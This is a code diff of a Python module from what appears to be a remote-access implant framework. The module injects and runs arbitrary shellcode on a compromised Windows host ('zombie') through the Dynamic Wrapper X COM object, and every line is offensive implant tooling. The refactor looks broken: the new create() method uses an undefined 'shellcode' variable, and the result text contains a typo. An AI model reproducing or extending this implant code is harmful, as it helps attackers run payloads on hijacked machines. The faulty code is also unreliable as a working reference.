@@ -1,10 +1,15 @@
 import core.implant
 import core.job
 import string
+import uuid
 
 class DynWrapXShellcodeJob(core.job.Job):
     def create(self):
         self.fork32Bit = True
+        self.options.set("DLLUUID", uuid.uuid4().hex)
+        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
+        self.options.set("SHELLCODEDECCSV", self.convert_shellcode(shellcode))
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
     def report(self, handler, data, sanitize = False):
         task = handler.get_header(self.options.get("UUIDHEADER"), False)
@@ -20,6 +25,7 @@ class DynWrapXShellcodeJob(core.job.Job):
         super(DynWrapXShellcodeJob, self).report(handler, data)
 
     def done(self):
+        self.results = "Cpmpleted"
         self.display()
 
     def display(self):
@@ -31,6 +37,7 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
     NAME = "Shellcode via Dynamic Wrapper X"
     DESCRIPTION = "Executes arbitrary shellcode using the Dynamic Wrapper X COM object"
     AUTHORS = ["zerosum0x0"]
+    STATE = "implant/inject/shellcode_dynwrapx"
 
     def load(self):
         self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)
@@ -46,19 +53,15 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
         self.options.register("DLLUUID", "ETag", "HTTP header for UUID", hidden=True)
         self.options.register("MANIFESTUUID", "ETag", "HTTP header for UUID", hidden=True)
 
+    def job(self):
+        return DynWrapXShellcodeJob
+
     def run(self):
-
-        import uuid
-        self.options.set("DLLUUID", uuid.uuid4().hex)
-        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
-
         shellcode = self.options.get("SHELLCODE")
 
         if not self.validate_shellcode(shellcode):
             self.shell.print_error("SHELLCODE option is an invalid hex string.")
             return
-
-        self.options.set("SHELLCODEDECCSV", self.convert_shellcode(shellcode))
 
         #vba = self.loader.load_script("data/implant/inject/shellcode.vba", self.options)
         #vba = vba.decode().replace("\n", "\\n")
@@ -66,6 +69,6 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
         #self.options.set("VBACODE", vba)
 
         workloads = {}
-        workloads["js"] = self.loader.load_script("data/implant/inject/shellcode_dynwrapx.js", self.options)
+        workloads["js"] = "data/implant/inject/shellcode_dynwrapx.js"
 
-        self.dispatch(workloads, DynWrapXShellcodeJob)
+        self.dispatch(workloads, self.job)
